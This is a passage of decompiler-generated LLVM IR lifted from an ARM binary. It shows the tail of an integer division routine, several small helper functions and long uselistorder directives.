  %v1_14e40 = phi i32 [ %v0_14e38.pr, %dec_label_pc_14e38thread-pre-split ], [ %v4_14e2c, %dec_label_pc_14e38.loopexit ]
  %v2_14e38 = icmp slt i32 %v1_14e40, 0
  br i1 %v2_14e38, label %dec_label_pc_14e4c, label %bb87

bb87:                                             ; preds = %dec_label_pc_14e38
  %v4_14e3c = icmp ult i32 %v1_14e40, %v2_14e3c
  br i1 %v4_14e3c, label %.thread4, label %dec_label_pc_14e4c

.thread4:                                         ; preds = %bb87
  %v3_14e40 = mul i32 %v1_14e40, 2
  %v2_14e44 = add i32 %v0_14e4c.pr, 1
  br label %dec_label_pc_14e38thread-pre-split

dec_label_pc_14e4c:                               ; preds = %bb87, %dec_label_pc_14e38
  %v2_14e4c = add i32 %v0_14e4c.pr, -3
  %v5_14e50 = icmp slt i32 %v0_14e4c.pr, 3
  br i1 %v5_14e50, label %dec_label_pc_14e90, label %dec_label_pc_14e54

dec_label_pc_14e54:                               ; preds = %dec_label_pc_14e4c, %bb91
  %v6_14e7c = phi i32 [ %v0_14e84, %bb91 ], [ %v2_14e4c, %dec_label_pc_14e4c ]
  %v1_14e58 = phi i32 [ %v1_14e60.v6_14e60.v6_14e68.v6_14e70, %bb91 ], [ %v2_14e3c, %dec_label_pc_14e4c ]
  %v3_14e7810 = phi i32 [ %v3_14e78, %bb91 ], [ %v1_14e40, %dec_label_pc_14e4c ]
  %v3_14e54 = icmp ult i32 %v1_14e58, %v3_14e7810
  %v3_14e58 = select i1 %v3_14e54, i32 0, i32 %v3_14e7810
  %v1_14e60 = sub i32 %v1_14e58, %v3_14e58
  %v4_14e5c = udiv i32 %v3_14e7810, 2
  %v6_14e5c = icmp ult i32 %v1_14e60, %v4_14e5c
  %v6_14e60 = select i1 %v6_14e5c, i32 0, i32 %v4_14e5c
  %v1_14e60.v6_14e60 = sub i32 %v1_14e60, %v6_14e60
  %.demorgan = and i1 %v3_14e54, %v6_14e5c
  %v4_14e64 = udiv i32 %v3_14e7810, 4
  %v6_14e64 = icmp ult i32 %v1_14e60.v6_14e60, %v4_14e64
  %v6_14e68 = select i1 %v6_14e64, i32 0, i32 %v4_14e64
  %v1_14e60.v6_14e60.v6_14e68 = sub i32 %v1_14e60.v6_14e60, %v6_14e68
  %.demorgan76 = and i1 %.demorgan, %v6_14e64
  %v4_14e6c = udiv i32 %v3_14e7810, 8
  %v6_14e6c = icmp ult i32 %v1_14e60.v6_14e60.v6_14e68, %v4_14e6c
  %v6_14e70 = select i1 %v6_14e6c, i32 0, i32 %v4_14e6c
  %v1_14e60.v6_14e60.v6_14e68.v6_14e70 = sub i32 %v1_14e60.v6_14e60.v6_14e68, %v6_14e70
  %.demorgan77 = and i1 %.demorgan76, %v6_14e6c
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_14e54
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_14e54, %bb88
  %v2_14e74 = add i32 %v1_14e60.v6_14e60.v6_14e68.v6_14e70, -1
  %v4_14e74 = sub i32 0, %v1_14e60.v6_14e60.v6_14e68.v6_14e70
  %v5_14e74 = and i32 %v1_14e60.v6_14e60.v6_14e68.v6_14e70, %v4_14e74
  %v3_14e78 = udiv i32 %v3_14e7810, 16
  %v5_14e7c = icmp slt i32 %v1_14e60.v6_14e60.v6_14e68.v6_14e70, 1
  br i1 %v5_14e7c, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_14e7c = add i32 %v6_14e7c, -4
  %v9_14e7c = sub i32 3, %v6_14e7c
  %v10_14e7c = and i32 %v9_14e7c, %v6_14e7c
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_14e84 = phi i32 [ %v6_14e7c, %bb89 ], [ %v7_14e7c, %bb90 ]
  %v0_14e8013.in = phi i32 [ %v2_14e74, %bb89 ], [ %v7_14e7c, %bb90 ]
  %v1_14e8012.in = phi i32 [ %v5_14e74, %bb89 ], [ %v10_14e7c, %bb90 ]
  %v1_14e8012 = icmp slt i32 %v1_14e8012.in, 0
  %v0_14e8013 = icmp slt i32 %v0_14e8013.in, 0
  %v2_14e80 = xor i1 %v0_14e8013, %v1_14e8012
  br i1 %v2_14e80, label %dec_label_pc_14e84, label %dec_label_pc_14e54

dec_label_pc_14e84:                               ; preds = %bb91
  %v1_14e84 = urem i32 %v0_14e84, 4
  %v2_14e84 = icmp eq i32 %v1_14e84, 0
  br i1 %v2_14e84, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_14e84
  %v3_14e88 = icmp eq i32 %v1_14e60.v6_14e60.v6_14e68.v6_14e70, 0
  br i1 %v3_14e88, label %.thread6, label %dec_label_pc_14e90

dec_label_pc_14e90:                               ; preds = %bb92, %dec_label_pc_14e4c
  %v0_14ea4 = phi i32 [ %v3_14e78, %bb92 ], [ %v1_14e40, %dec_label_pc_14e4c ]
  %v1_14ea0 = phi i32 [ %v1_14e60.v6_14e60.v6_14e68.v6_14e70, %bb92 ], [ %v2_14e3c, %dec_label_pc_14e4c ]
  %v0_14e90 = phi i32 [ %v0_14e84, %bb92 ], [ %v2_14e4c, %dec_label_pc_14e4c ]
  %v5_14e94 = icmp slt i32 %v0_14e90, -2
  br i1 %v5_14e94, label %dec_label_pc_14eb4, label %dec_label_pc_14e98

dec_label_pc_14e98:                               ; preds = %dec_label_pc_14e90
  %v8_14e90 = icmp eq i32 %v0_14e90, -2
  br i1 %v8_14e90, label %dec_label_pc_14ea8, label %dec_label_pc_14e9c

dec_label_pc_14e9c:                               ; preds = %dec_label_pc_14e98
  %v3_14e9c = icmp ult i32 %v1_14ea0, %v0_14ea4
  br i1 %v3_14e9c, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_14e9c
  %v2_14e9c = sub i32 %v1_14ea0, %v0_14ea4
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_14e9c, %bb93
  %v0_14ea854 = phi i32 [ %v1_14ea0, %dec_label_pc_14e9c ], [ %v2_14e9c, %bb93 ]
  %v3_14ea4 = udiv i32 %v0_14ea4, 2
  br label %dec_label_pc_14ea8

dec_label_pc_14ea8:                               ; preds = %dec_label_pc_14e98, %bb94
  %v0_14eb0 = phi i32 [ %v0_14ea4, %dec_label_pc_14e98 ], [ %v3_14ea4, %bb94 ]
  %v1_14eac = phi i32 [ %v1_14ea0, %dec_label_pc_14e98 ], [ %v0_14ea854, %bb94 ]
  %v3_14ea8 = icmp ult i32 %v1_14eac, %v0_14eb0
  br i1 %v3_14ea8, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_14ea8
  %v2_14ea8 = sub i32 %v1_14eac, %v0_14eb0
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_14ea8, %bb95
  %v0_14eb457 = phi i32 [ %v1_14eac, %dec_label_pc_14ea8 ], [ %v2_14ea8, %bb95 ]
  %v3_14eb0 = udiv i32 %v0_14eb0, 2
  br label %dec_label_pc_14eb4

dec_label_pc_14eb4:                               ; preds = %dec_label_pc_14e90, %bb96
  %v2_14eb8 = phi i32 [ %v0_14ea4, %dec_label_pc_14e90 ], [ %v3_14eb0, %bb96 ]
  %v1_14eb8 = phi i32 [ %v1_14ea0, %dec_label_pc_14e90 ], [ %v0_14eb457, %bb96 ]
  %v3_14eb4 = icmp ult i32 %v1_14eb8, %v2_14eb8
  br i1 %v3_14eb4, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_14eb4
  %v2_14eb4 = sub i32 %v1_14eb8, %v2_14eb8
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14eb4, %bb83, %.thread72, %dec_label_pc_14e84, %bb92, %bb97
  %v1_14ec0 = phi i32 [ %v1_14e60.v6_14e60.v6_14e68.v6_14e70, %dec_label_pc_14e84 ], [ 0, %bb92 ], [ %v1_14eb8, %dec_label_pc_14eb4 ], [ %v2_14eb4, %bb97 ], [ %v3_14e18, %.thread72 ], [ %v1_14e0c, %bb83 ]
  br i1 %v1_14e00, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_14ec0 = sub i32 0, %v1_14ec0
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_14ec4 = phi i32 [ %v1_14ec0, %.thread6 ], [ %v2_14ec0, %bb98 ]
  ret i32 %v1_14ec4

dec_label_pc_14ec8:                               ; preds = %entry
  %v0_14ec8 = load i32, i32* @lr, align 4
  %v0_14ecc = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_14ec8)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_14ea4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_14e84, { 1, 0, 2 }
  uselistorder i32 %v7_14e7c, { 1, 0 }
  uselistorder i32 %v3_14e78, { 1, 0 }
  uselistorder i32 %v1_14e60.v6_14e60.v6_14e68.v6_14e70, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_14e6c, { 1, 0 }
  uselistorder i32 %v4_14e64, { 1, 0 }
  uselistorder i32 %v4_14e5c, { 1, 0 }
  uselistorder i32 %v6_14e7c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_14e4c, { 1, 0 }
  uselistorder i32 %v1_14e40, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_14e3c, { 1, 0, 3, 2 }
  uselistorder i32 %v4_14e2c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_14e38.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14e0c, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_14e14, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 2, 1, 0 }
  uselistorder i32* @lr, { 9, 10, 11, 5, 2, 3, 0, 6, 1, 7, 4, 8 }
  uselistorder i32 -2, { 0, 12, 1, 13, 2, 3, 10, 8, 9, 7, 6, 5, 4, 20, 21, 22, 23, 11, 19, 18, 17, 16, 15, 14 }
  uselistorder i32 8, { 7, 8, 53, 19, 9, 10, 16, 11, 59, 42, 25, 60, 43, 26, 61, 44, 27, 12, 13, 14, 55, 45, 62, 24, 116, 117, 118, 119, 121, 46, 122, 123, 120, 63, 64, 47, 65, 15, 48, 66, 28, 67, 68, 69, 70, 71, 72, 73, 74, 75, 3, 76, 77, 78, 4, 79, 80, 81, 82, 83, 84, 85, 5, 86, 87, 88, 89, 90, 91, 92, 6, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 29, 104, 30, 105, 31, 106, 32, 107, 33, 108, 34, 109, 35, 110, 36, 111, 37, 112, 38, 113, 39, 114, 49, 115, 0, 1, 124, 125, 126, 127, 52, 128, 129, 50, 130, 2, 17, 20, 21, 131, 18, 22, 23, 132, 51, 56, 57, 133, 134, 136, 135, 137, 138, 40, 139, 54, 58, 41, 140 }
  uselistorder i32 3, { 68, 21, 69, 22, 175, 70, 79, 38, 23, 25, 80, 41, 81, 1, 82, 83, 84, 85, 39, 3, 159, 160, 161, 162, 42, 163, 43, 164, 44, 165, 45, 166, 46, 167, 47, 168, 24, 169, 48, 170, 40, 171, 49, 86, 50, 87, 88, 26, 91, 51, 52, 53, 54, 55, 0, 89, 90, 56, 92, 93, 94, 95, 96, 97, 57, 98, 58, 99, 27, 100, 101, 102, 103, 104, 5, 4, 59, 28, 105, 106, 107, 108, 109, 110, 111, 7, 6, 60, 112, 29, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 9, 8, 61, 123, 30, 124, 125, 126, 127, 128, 11, 10, 62, 129, 31, 130, 131, 132, 133, 63, 134, 13, 12, 33, 135, 32, 136, 137, 138, 139, 64, 140, 15, 14, 35, 141, 34, 142, 143, 144, 145, 146, 147, 17, 16, 65, 148, 36, 149, 150, 151, 152, 153, 154, 155, 19, 18, 66, 156, 37, 157, 20, 158, 2, 172, 173, 71, 75, 72, 76, 73, 77, 74, 78, 67, 174 }
  uselistorder i32 -3, { 0, 1, 3, 2 }
  uselistorder i32 2, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 147, 13, 14, 15, 16, 17, 77, 78, 76, 51, 52, 151, 79, 152, 64, 82, 154, 161, 65, 153, 81, 155, 66, 156, 67, 157, 68, 158, 69, 159, 70, 160, 71, 166, 162, 163, 164, 165, 60, 83, 256, 18, 19, 257, 259, 260, 84, 262, 55, 149, 85, 264, 86, 265, 87, 266, 88, 267, 268, 80, 269, 20, 89, 258, 173, 174, 21, 90, 91, 92, 175, 176, 93, 244, 148, 150, 181, 95, 167, 98, 168, 97, 169, 94, 99, 170, 22, 23, 24, 100, 96, 101, 102, 103, 171, 172, 104, 105, 61, 107, 108, 106, 109, 177, 53, 59, 178, 179, 180, 261, 263, 182, 183, 184, 185, 186, 187, 188, 111, 189, 110, 190, 191, 192, 193, 194, 113, 112, 195, 196, 197, 198, 199, 200, 201, 115, 202, 114, 203, 204, 116, 117, 72, 118, 205, 206, 119, 120, 73, 121, 207, 208, 209, 210, 211, 212, 213, 0, 25, 26, 27, 28, 29, 30, 122, 214, 74, 215, 216, 217, 218, 219, 1, 31, 32, 33, 34, 35, 36, 124, 123, 220, 221, 37, 222, 223, 56, 224, 126, 225, 2, 38, 39, 40, 41, 42, 127, 226, 125, 227, 228, 43, 229, 230, 57, 231, 129, 232, 3, 44, 45, 46, 47, 48, 130, 233, 128, 234, 235, 236, 237, 238, 239, 240, 241, 132, 242, 131, 243, 245, 246, 247, 134, 248, 135, 249, 250, 251, 252, 136, 253, 133, 254, 62, 255, 137, 63, 270, 54, 138, 271, 272, 75, 273, 145, 274, 139, 275, 140, 141, 276, 142, 277, 143, 278, 144, 279, 58, 280, 49, 50, 281, 146, 282 }
  uselistorder i32 4, { 6, 7, 64, 8, 9, 65, 414, 415, 181, 10, 11, 182, 91, 69, 386, 387, 57, 185, 92, 186, 136, 187, 351, 352, 353, 203, 204, 56, 55, 354, 188, 189, 183, 184, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 94, 206, 207, 208, 205, 66, 355, 95, 209, 70, 96, 97, 12, 356, 13, 357, 358, 14, 15, 359, 360, 49, 361, 48, 366, 98, 367, 99, 368, 100, 369, 101, 370, 102, 371, 103, 373, 93, 374, 375, 372, 362, 104, 363, 364, 365, 217, 137, 219, 16, 220, 221, 218, 17, 222, 50, 105, 223, 224, 310, 226, 210, 60, 59, 58, 211, 106, 18, 19, 20, 21, 22, 23, 212, 51, 213, 52, 214, 215, 216, 24, 25, 107, 71, 108, 109, 138, 225, 0, 110, 26, 227, 228, 139, 229, 230, 231, 140, 141, 112, 232, 111, 233, 72, 234, 235, 142, 236, 237, 143, 144, 238, 73, 239, 74, 240, 241, 145, 146, 242, 147, 243, 244, 148, 149, 113, 245, 75, 246, 76, 247, 248, 249, 250, 251, 114, 252, 77, 253, 254, 255, 256, 257, 115, 258, 78, 259, 260, 261, 150, 262, 263, 264, 265, 151, 152, 2, 266, 116, 267, 79, 268, 269, 270, 153, 271, 272, 154, 155, 3, 117, 273, 80, 274, 81, 275, 276, 156, 277, 278, 279, 280, 281, 157, 158, 282, 283, 118, 284, 4, 119, 285, 82, 286, 120, 287, 288, 159, 289, 290, 291, 292, 293, 160, 161, 294, 295, 121, 296, 5, 122, 297, 83, 298, 123, 299, 300, 301, 302, 303, 162, 304, 305, 306, 163, 164, 125, 307, 124, 84, 308, 85, 309, 311, 312, 313, 314, 315, 127, 316, 128, 317, 165, 318, 319, 320, 166, 167, 129, 321, 126, 322, 86, 323, 87, 324, 168, 325, 326, 27, 169, 327, 328, 28, 170, 329, 330, 29, 171, 331, 332, 30, 172, 333, 334, 31, 173, 67, 335, 336, 32, 337, 174, 338, 339, 33, 175, 340, 341, 34, 176, 342, 343, 35, 177, 344, 345, 36, 178, 346, 347, 37, 179, 348, 349, 38, 388, 350, 376, 377, 378, 379, 380, 381, 39, 382, 383, 1, 384, 180, 385, 389, 411, 135, 390, 90, 391, 392, 68, 393, 131, 394, 395, 396, 397, 88, 398, 132, 399, 400, 401, 89, 402, 133, 403, 40, 41, 42, 404, 405, 63, 62, 61, 406, 43, 44, 45, 134, 407, 130, 408, 46, 47, 409, 53, 410, 54, 412, 413 }
  uselistorder i32 16, { 5, 6, 7, 8, 9, 25, 10, 11, 0, 12, 13, 46, 162, 47, 77, 30, 48, 78, 79, 163, 164, 165, 166, 26, 76, 14, 15, 24, 73, 16, 167, 17, 49, 50, 82, 31, 83, 35, 34, 33, 80, 32, 81, 36, 51, 52, 53, 54, 55, 56, 84, 57, 85, 58, 59, 27, 86, 87, 88, 89, 60, 90, 91, 92, 93, 94, 95, 61, 96, 97, 98, 38, 99, 37, 40, 100, 39, 101, 102, 63, 103, 104, 105, 106, 107, 1, 62, 108, 109, 110, 65, 111, 112, 113, 114, 115, 2, 64, 116, 66, 117, 118, 119, 18, 120, 19, 121, 74, 20, 67, 68, 122, 123, 3, 42, 124, 41, 125, 69, 126, 127, 128, 21, 129, 22, 130, 75, 23, 70, 71, 131, 132, 4, 44, 133, 43, 134, 135, 136, 137, 138, 139, 28, 140, 141, 142, 143, 145, 144, 146, 147, 148, 149, 150, 151, 152, 29, 153, 154, 155, 156, 157, 159, 158, 160, 161, 168, 169, 170, 171, 172, 72, 173, 45, 174, 175, 176, 177, 178 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_14eb4, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_14ea8, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_14e54, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_14ed8 = load i32, i32* @r0, align 4
  ret i32 %v1_14ed8
}

define i32 @function_14edc(i32 %arg1) local_unnamed_addr {
dec_label_pc_14edc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14ee0 = load i32, i32* @global_var_1d76c.650, align 4
  %v7_14ee4 = icmp eq i32 %v3_14ee0, -1
  %v3_14ee8 = load i32, i32* @r4, align 4
  store i32 %v3_14ee8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1d76c.650 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_14ee4, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_14edc
  store i32 %v3_14ee8, i32* %r4.global-to-local, align 4
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_14edc, %.preheader
  %v0_14ef8 = phi i32 [ %v3_14efc, %.preheader ], [ %v3_14ee0, %dec_label_pc_14edc ]
  call void @__pseudo_branch(i32 %v0_14ef8)
  %v0_14efc = load i32, i32* %r4.global-to-local, align 4
  %v1_14efc = add i32 %v0_14efc, -4
  %v2_14efc = inttoptr i32 %v1_14efc to i32*
  %v3_14efc = load i32, i32* %v2_14efc, align 4
  store i32 %v1_14efc, i32* %r4.global-to-local, align 4
  %v3_14f00 = icmp eq i32 %v3_14efc, -1
  br i1 %v3_14f00, label %dec_label_pc_14f08, label %.preheader

dec_label_pc_14f08:                               ; preds = %.preheader
  %v2_14f08 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14f08, i32* %r4.global-to-local, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v3_14efc, { 1, 0 }
  uselistorder i32 %v3_14ee0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 4, 0, 2, 1, 3 }
  uselistorder i32 -4, { 12, 0, 1, 8, 2, 3, 4, 5, 9, 6, 7, 10, 11 }
  uselistorder i32 -1, { 122, 0, 123, 124, 125, 126, 127, 128, 129, 130, 1, 2, 3, 4, 5, 95, 96, 6, 131, 132, 11, 133, 237, 10, 134, 94, 93, 238, 7, 135, 224, 98, 225, 227, 228, 136, 137, 138, 97, 226, 12, 139, 88, 13, 140, 141, 14, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 229, 8, 162, 9, 163, 164, 15, 165, 166, 99, 239, 167, 16, 168, 240, 89, 17, 18, 169, 92, 19, 20, 21, 22, 23, 100, 234, 170, 235, 171, 236, 108, 230, 24, 106, 231, 25, 26, 107, 232, 27, 28, 109, 233, 29, 30, 31, 32, 33, 172, 82, 83, 84, 85, 86, 87, 34, 35, 36, 173, 174, 175, 176, 37, 102, 103, 104, 105, 38, 39, 40, 177, 41, 42, 43, 44, 45, 90, 46, 47, 48, 49, 50, 51, 52, 178, 53, 101, 54, 55, 56, 179, 57, 58, 59, 60, 61, 180, 62, 63, 64, 181, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 182, 76, 77, 78, 183, 79, 80, 184, 185, 186, 187, 81, 91, 241, 242, 115, 243, 113, 244, 114, 245, 111, 246, 188, 189, 190, 191, 192, 116, 247, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 110, 248, 117, 249, 219, 220, 221, 222, 223, 112, 250, 118, 251, 119, 120, 121 }
  uselistorder i32 1, { 559, 54, 370, 1047, 1048, 371, 1049, 1050, 285, 1051, 948, 949, 950, 303, 951, 562, 561, 560, 243, 251, 246, 247, 249, 248, 245, 244, 250, 0, 952, 953, 954, 955, 253, 252, 1, 956, 957, 958, 959, 310, 960, 961, 311, 962, 564, 563, 270, 268, 269, 749, 750, 751, 416, 565, 262, 261, 260, 258, 259, 963, 327, 328, 2, 3, 964, 965, 967, 966, 417, 968, 235, 234, 935, 217, 969, 970, 971, 216, 215, 214, 972, 566, 222, 219, 220, 225, 221, 226, 223, 224, 218, 973, 974, 567, 197, 196, 195, 194, 198, 199, 975, 976, 568, 51, 50, 49, 48, 52, 53, 418, 681, 419, 682, 372, 683, 684, 869, 685, 699, 427, 679, 680, 428, 686, 330, 429, 430, 425, 687, 688, 426, 689, 690, 424, 691, 692, 423, 693, 694, 422, 695, 696, 421, 697, 698, 420, 700, 701, 870, 431, 871, 432, 872, 874, 875, 873, 876, 433, 877, 678, 329, 880, 878, 434, 879, 882, 435, 883, 884, 889, 361, 890, 891, 436, 892, 437, 893, 438, 894, 439, 895, 440, 896, 441, 897, 442, 898, 443, 899, 444, 900, 445, 901, 446, 902, 447, 903, 448, 904, 449, 905, 450, 906, 451, 907, 452, 908, 453, 909, 454, 910, 455, 911, 456, 912, 457, 913, 458, 914, 459, 915, 460, 916, 461, 917, 462, 918, 463, 919, 464, 920, 465, 921, 466, 922, 467, 923, 468, 924, 469, 925, 470, 926, 471, 927, 331, 933, 934, 304, 472, 582, 581, 580, 579, 578, 577, 576, 575, 574, 573, 572, 571, 570, 569, 271, 275, 272, 278, 281, 279, 280, 274, 273, 276, 277, 928, 929, 930, 931, 473, 932, 583, 19, 17, 18, 11, 10, 14, 16, 15, 13, 9, 12, 881, 474, 585, 584, 264, 266, 263, 265, 708, 709, 710, 711, 712, 713, 714, 286, 298, 715, 716, 332, 287, 717, 718, 719, 720, 288, 297, 721, 722, 333, 289, 723, 475, 725, 726, 476, 727, 724, 728, 366, 729, 312, 732, 733, 730, 731, 291, 290, 292, 734, 477, 735, 592, 591, 550, 590, 589, 588, 549, 587, 586, 157, 155, 156, 164, 159, 161, 165, 162, 168, 163, 158, 167, 160, 166, 593, 59, 858, 313, 857, 360, 594, 174, 175, 173, 171, 170, 177, 178, 169, 172, 176, 760, 761, 762, 478, 596, 595, 94, 96, 104, 91, 93, 90, 103, 95, 101, 102, 105, 92, 97, 98, 100, 99, 597, 377, 702, 703, 373, 704, 479, 481, 480, 482, 705, 706, 483, 484, 485, 486, 487, 488, 489, 376, 375, 374, 707, 490, 610, 609, 608, 607, 551, 606, 552, 605, 604, 603, 602, 601, 553, 600, 599, 598, 238, 239, 241, 242, 240, 736, 612, 611, 493, 492, 491, 737, 614, 613, 267, 494, 738, 344, 739, 343, 740, 342, 741, 341, 742, 743, 495, 351, 334, 744, 496, 745, 497, 746, 498, 747, 499, 748, 305, 500, 628, 627, 626, 625, 624, 623, 622, 621, 620, 619, 618, 617, 616, 615, 86, 84, 85, 89, 87, 88, 83, 757, 5, 752, 501, 753, 4, 754, 362, 755, 306, 307, 756, 758, 363, 759, 633, 632, 631, 554, 630, 555, 629, 200, 634, 885, 378, 886, 379, 887, 6, 888, 7, 8, 763, 764, 765, 766, 767, 768, 308, 309, 769, 770, 771, 772, 773, 774, 775, 776, 502, 777, 778, 503, 779, 780, 783, 781, 782, 637, 636, 635, 182, 187, 186, 183, 179, 181, 180, 189, 190, 193, 191, 184, 192, 188, 185, 784, 785, 786, 787, 788, 504, 314, 505, 639, 638, 135, 131, 127, 126, 125, 124, 133, 134, 128, 132, 129, 130, 789, 790, 791, 506, 792, 793, 794, 795, 796, 797, 507, 798, 315, 508, 381, 380, 509, 799, 640, 65, 63, 61, 62, 60, 71, 70, 69, 68, 66, 67, 64, 800, 367, 294, 801, 510, 803, 802, 293, 511, 383, 382, 556, 641, 73, 74, 76, 75, 804, 368, 296, 805, 512, 807, 806, 295, 513, 385, 384, 557, 642, 254, 255, 257, 256, 808, 809, 810, 811, 812, 813, 514, 814, 316, 515, 516, 815, 386, 816, 643, 32, 28, 29, 30, 31, 36, 37, 39, 38, 34, 35, 33, 817, 818, 345, 819, 820, 821, 517, 822, 317, 518, 388, 387, 519, 823, 520, 824, 644, 77, 80, 81, 82, 79, 78, 825, 826, 346, 827, 828, 829, 521, 830, 318, 522, 396, 395, 523, 831, 394, 832, 393, 833, 389, 834, 390, 835, 391, 836, 524, 837, 392, 838, 649, 648, 647, 646, 645, 21, 24, 25, 26, 23, 20, 27, 22, 839, 840, 347, 841, 842, 843, 525, 844, 319, 526, 401, 400, 527, 845, 397, 846, 398, 847, 399, 848, 654, 653, 652, 651, 650, 41, 44, 45, 47, 46, 40, 43, 42, 849, 850, 851, 348, 852, 853, 854, 320, 528, 404, 403, 529, 855, 402, 856, 655, 141, 140, 139, 137, 136, 143, 144, 146, 145, 138, 142, 859, 860, 861, 349, 862, 863, 864, 321, 530, 407, 406, 531, 865, 405, 866, 660, 659, 658, 657, 656, 207, 206, 205, 204, 202, 201, 210, 211, 213, 212, 203, 209, 208, 867, 408, 532, 661, 147, 152, 150, 153, 149, 151, 154, 148, 977, 72, 868, 236, 662, 106, 107, 936, 533, 939, 534, 940, 941, 937, 938, 942, 943, 944, 945, 322, 946, 323, 227, 231, 233, 228, 229, 230, 232, 947, 335, 535, 663, 57, 58, 56, 55, 978, 237, 979, 299, 539, 352, 353, 980, 300, 537, 354, 355, 538, 981, 336, 982, 350, 983, 301, 356, 542, 357, 365, 302, 540, 358, 359, 541, 984, 337, 985, 986, 415, 987, 988, 989, 410, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 411, 1002, 1003, 1004, 1005, 1006, 325, 1007, 543, 1008, 544, 545, 1009, 1010, 1011, 1012, 1013, 412, 1014, 1015, 1016, 338, 1017, 413, 1018, 1019, 1020, 339, 1021, 414, 1022, 1023, 1024, 340, 1025, 1026, 1027, 1028, 326, 1029, 1030, 1031, 324, 536, 409, 1032, 1034, 1036, 1035, 1033, 546, 1037, 1038, 1039, 547, 1040, 1041, 1042, 1043, 369, 1044, 1045, 364, 548, 1046, 675, 674, 673, 672, 671, 670, 669, 668, 667, 666, 665, 664, 112, 111, 108, 109, 110, 115, 121, 122, 114, 123, 116, 113, 117, 119, 118, 120, 676, 677, 284, 283, 282, 558 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_14f10() local_unnamed_addr {
dec_label_pc_14f10:
  %v5_14f14 = load i32, i32* @r0, align 4
  ret i32 %v5_14f14

; uselistorder directives
  uselistorder i32* @r0, { 3, 6, 101, 7, 102, 8, 103, 10, 9, 60, 61, 0, 14, 49, 50, 52, 53, 54, 55, 58, 51, 15, 16, 2, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 56, 57, 1, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 62, 59, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 4, 5, 11, 12, 13 }
}

define i32 @function_14f18() local_unnamed_addr {
entry:
  %v3_14f1c = load i32, i32* @r4, align 4
  %v0_14f24 = call i32 @function_8e08()
  call void @__pseudo_branch(i32 %v3_14f1c)
  ret i32 %v0_14f24

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 6, 8, 9, 10, 1, 2, 3, 4, 5, 7 }
